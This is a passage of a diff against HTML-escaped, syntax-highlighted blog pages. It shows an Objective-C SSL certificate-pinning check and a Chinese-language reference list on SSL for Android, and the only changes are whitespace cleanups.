 &lt;span class=&quot;lineno&quot;&gt;15&lt;/span&gt;             &lt;span class=&quot;bp&quot;&gt;NSData&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;localCertData&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;NSData&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;dataWithContentsOfFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:[[&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;NSBundle&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mainBundle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
 &lt;span class=&quot;lineno&quot;&gt;16&lt;/span&gt;                                                    &lt;span class=&quot;nl&quot;&gt;pathForResource&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;@&amp;quot;random-org&amp;quot;&lt;/span&gt;
 &lt;span class=&quot;lineno&quot;&gt;17&lt;/span&gt;                                                             &lt;span class=&quot;nl&quot;&gt;ofType&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;@&amp;quot;der&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]];&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;18&lt;/span&gt;             
+&lt;span class=&quot;lineno&quot;&gt;18&lt;/span&gt; 
 &lt;span class=&quot;lineno&quot;&gt;19&lt;/span&gt;             &lt;span class=&quot;n&quot;&gt;SecCertificateRef&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remoteServerCert&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SecTrustGetCertificateAtIndex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serverTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
 &lt;span class=&quot;lineno&quot;&gt;20&lt;/span&gt;             &lt;span class=&quot;n&quot;&gt;CFDataRef&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remoteCertData&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SecCertificateCopyData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;remoteServerCert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
 &lt;span class=&quot;lineno&quot;&gt;21&lt;/span&gt;             &lt;span class=&quot;kt&quot;&gt;BOOL&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;isMatch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;localCertData&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;isEqualToData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;__bridge&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;NSData&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;remoteCertData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
 &lt;span class=&quot;lineno&quot;&gt;22&lt;/span&gt;             &lt;span class=&quot;n&quot;&gt;CFRelease&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;remoteCertData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;23&lt;/span&gt;             
+&lt;span class=&quot;lineno&quot;&gt;23&lt;/span&gt; 
 &lt;span class=&quot;lineno&quot;&gt;24&lt;/span&gt;             &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;isMatch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
 &lt;span class=&quot;lineno&quot;&gt;25&lt;/span&gt;                 &lt;span class=&quot;n&quot;&gt;completionHandler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLSessionAuthChallengeUseCredential&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;NSURLCredential&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;credentialForTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serverTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
 &lt;span class=&quot;lineno&quot;&gt;26&lt;/span&gt;             &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
@@ -729,7 +891,7 @@ command=&quot;[path]/gl-auth-command sitaram&quot;,[more options] ssh-rsa AAAAB3
 
 &lt;h3 id=&quot;section-5&quot;&gt;參考&lt;/h3&gt;
 &lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;http://android-ssl.org&quot;&gt;Rethinking SSL Development in an Appified World&lt;/a&gt; &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;http://android-ssl.org&quot;&gt;Rethinking SSL Development in an Appified World&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href=&quot;http://android-developers.blogspot.com/2012/03/unifying-key-store-access-in-ics.html&quot;&gt;Unifying Key Store Access in ICS | Android Developers Blog&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href=&quot;http://commonsware.com/blog/2013/03/04/ssl-android-basics.html&quot;&gt;The CommonsBlog — SSL on Android: The Basics&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href=&quot;https://developer.android.com/training/articles/security-ssl.html&quot;&gt;Security with HTTPS and SSL | Android Developers&lt;/a&gt;&lt;/li&gt;
